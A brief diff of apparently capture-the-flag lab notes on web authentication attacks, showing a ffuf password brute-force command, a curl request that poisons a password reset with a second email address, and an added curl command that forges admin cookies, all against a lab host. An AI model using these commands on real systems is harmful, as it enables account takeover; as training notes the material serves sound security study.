@@ -15,3 +15,7 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 ```
 
 curl 'http://10.10.5.155/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=azim@customer.acmeitsupport.thm'
+
+```shell-session
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.5.155/cookie-test
+```
